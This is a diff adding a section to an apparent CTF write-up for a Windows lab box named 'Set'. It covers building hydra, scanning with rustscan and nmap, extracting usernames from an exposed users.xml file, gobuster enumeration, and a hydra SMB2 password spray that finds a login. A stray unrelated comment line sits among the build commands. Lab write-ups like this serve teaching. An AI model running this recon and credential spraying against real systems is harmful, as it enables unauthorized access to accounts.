@@ -905,7 +905,160 @@ And in our ataacker machine:
           whoami
           nt authority\system
 
- 
+ # SET
+
+           
+        
+           ▄▀▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▀█▀▀▄ 
+          █ █   ▐ ▐  ▄▀   ▐ █    █  ▐ 
+             ▀▄     █▄▄▄▄▄  ▐   █     
+          ▀▄   █    █    ▌     █      
+           █▀▀▀    ▄▀▄▄▄▄    ▄▀       
+           ▐       █    ▐   █         
+                   ▐        ▐         
+
+## Note about hydra
+Since maybe the few eager readers of these write-up might have guessed, I try to avoid using MSF, so for this box I needed to use <b>hydra</b> compiled with smb2 support. The default Kali version does not include it. Following the instructions to install hydra with smb2/3 support (I also installed the support for SSH too):
+
+          sudo apt remove --purge hydra 
+          sudo apt install libsmbclient-dev
+          sudo apt install libssh-dev
+          sudo git clone https://github.com/vanhauser-thc/thc-hydra.git
+          cd thc-hydra
+          sudo ./configure
+          sudo make
+          # If men could get pregnant, abortion would be a sacrament 
+          sudo make install
+          hydra -h | grep smb
+          Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smb2 smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp
+
+## Services discovering
+
+          rustscan -b 900 -a 10.10.254.1
+          ...
+          PORT      STATE SERVICE      REASON
+          135/tcp   open  msrpc        syn-ack
+          443/tcp   open  https        syn-ack
+          445/tcp   open  microsoft-ds syn-ack
+          5985/tcp  open  wsman        syn-ack
+          49666/tcp open  unknown      syn-ack
+
+We have few services active, let's proceed to fingerprint:
+
+          nmap -p 135,443,445,5985,49666 -Pn -sVC 10.10.254.1
+          ...
+          PORT      STATE SERVICE       VERSION
+          135/tcp   open  msrpc         Microsoft Windows RPC
+          443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+          |_ssl-date: 2024-07-04T08:56:00+00:00; +8s from scanner time.
+          | ssl-cert: Subject: commonName=set.windcorp.thm
+          | Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm
+          | Not valid before: 2020-06-07T15:00:22
+          |_Not valid after:  2036-10-07T15:10:21
+          |_http-server-header: Microsoft-HTTPAPI/2.0
+          |_http-title: Not Found
+          | tls-alpn: 
+          |_  http/1.1
+          445/tcp   open  microsoft-ds?
+          5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+          |_http-title: Not Found
+          |_http-server-header: Microsoft-HTTPAPI/2.0
+          49666/tcp open  msrpc         Microsoft Windows RPC
+          Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+          
+          Host script results:
+          | smb2-security-mode: 
+          |   3:1:1: 
+          |_    Message signing enabled but not required
+          ...
+
+Let's update our hosts file with the discovered SAN
+
+          10.10.254.1    set.windcorp.thm seth.windcorp.thm
+          
+Now navigating the web site using DevTools, in the network tabs we can see a request for the following JS file:
+
+          https://set.windcorp.thm/assets/js/search.js
+
+The source code reveals an interesting file:
+
+          function searchFor() {
+            var xmlhttp = new XMLHttpRequest();
+            xmlhttp.onreadystatechange = function() {
+              if (this.readyState == 4 && this.status == 200) {
+                myFunction(this);
+              }
+            };
+            xmlhttp.open("GET", "assets/data/users.xml" , true);
+            xmlhttp.send();
+          }
+
+Let see the contents:
+
+          https://set.windcorp.thm/assets/data/users.xml
+
+So we have a list of users that we can eventually use later in a brute-forcing attack. To extract the users email from the XML file I used the following Pythonn script:
+
+          import xml.etree.ElementTree as ET
+          tree = ET.parse('users.xml')
+          root = tree.getroot()        
+          with open('users.txt', 'w') as file:
+              for email in root.findall('.//email'):
+                  file.write(email.text + '\n')
+
+Then we have our list in the users.txt file. To get rid of the domain part we can use the following command:
+
+          sed -i 's/@windcorp\.thm//g' users.txt
 
 
-    
+Now let's if there are any shared folders that we can access anonymously:
+
+          smbmap -H set.windcorp.thm 
+          ...
+          [*] Detected 1 hosts serving SMB                                                                                                  
+          [*] Established 0 SMB connections(s) and 0 authenticated session(s)                                                               
+          [*] Closed 0 connections 
+
+Then let's see if we can found any useful resources on the website:
+
+          gobuster dir -u https://set.windcorp.thm  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -k -x txt,bak,old,config
+          ...
+          ===============================================================
+          Starting gobuster in directory enumeration mode
+          ===============================================================
+          /assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/assets/]
+          /forms                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/forms/]
+          /Forms                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/Forms/]
+          /Assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/Assets/]
+          /appnotes.txt         (Status: 200) [Size: 146]
+
+There is a txt file that contains the following text: <i>Remember to change your default password at once. It is too common.</i>. In a CTF context it sounds as a suggestion to use a common wordlist for the password.
+Let's search them:
+
+          tree /usr/share/seclists/Passwords| grep common
+          ├── common_corporate_passwords.lst
+          │   ├── 10k-most-common.txt
+          │   ├── common-passwords-win.txt
+          │   ├── top-20-common-SSH-passwords.txt
+          ├── dutch_common_wordlist.txt
+
+The first try I made was with common_corporate_passwords.lst, it takes more than 2 hours with no results. Then I tried with common-passwords-win.txt, again I foud nothing. At the third attempt, finally, I got a password for the a user:
+
+          sudo hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt 10.10.254.1 smb2
+          ...
+          [DATA] max 16 tasks per 1 server, overall 16 tasks, 2640 login tries (l:120/p:22), ~165 tries per task
+          [DATA] attacking smb2://10.10.254.1:445/
+          [STATUS] 1641.00 tries/min, 1641 tries in 00:01h, 999 to do in 00:01h, 16 active
+          [WARNING] 10.10.254.1 might accept any credential
+          [445][smb2] host: 10.10.254.1   login: myrtleowe   password: XXXXXXX
+          1 of 1 target successfully completed, 1 valid password found
+
+
+
+
+
+          
+
+         
+
+          
